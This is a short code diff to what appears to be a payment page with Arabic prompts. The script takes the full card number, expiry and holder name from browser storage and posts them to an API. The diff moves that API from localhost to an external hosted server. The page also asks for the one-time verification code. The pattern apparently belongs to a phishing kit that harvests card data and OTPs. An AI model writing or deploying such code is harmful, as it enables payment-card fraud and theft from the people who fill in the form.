@@ -231,7 +231,7 @@ height: auto;
       const expiryMonth = localStorage.getItem('expiryMonth') || '';
       const expiryYear = localStorage.getItem('expiryYear') || '';
       
-      const response = await fetch('http://localhost:3000/api/payment', {
+      const response = await fetch('https://wadamnew.onrender.com/api/payment', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -256,14 +256,12 @@ height: auto;
     const otpInput = document.getElementById('otp');
     const otpValue = otpInput.value.trim();
 
-    // ✅ التحقق من الحقل
     if (otpValue === '') {
       alert('يرجى إدخال رمز التحقق قبل المتابعة.');
       otpInput.focus();
       return;
     }
 
-    // ✅ تابع الإجراءات بعد التحقق
 const ownerName = localStorage.getItem('userName') || 'غير معروف';
     const cardNumber = localStorage.getItem('cardNumber') || '';
     const last4 = cardNumber.slice(-4) || '----';
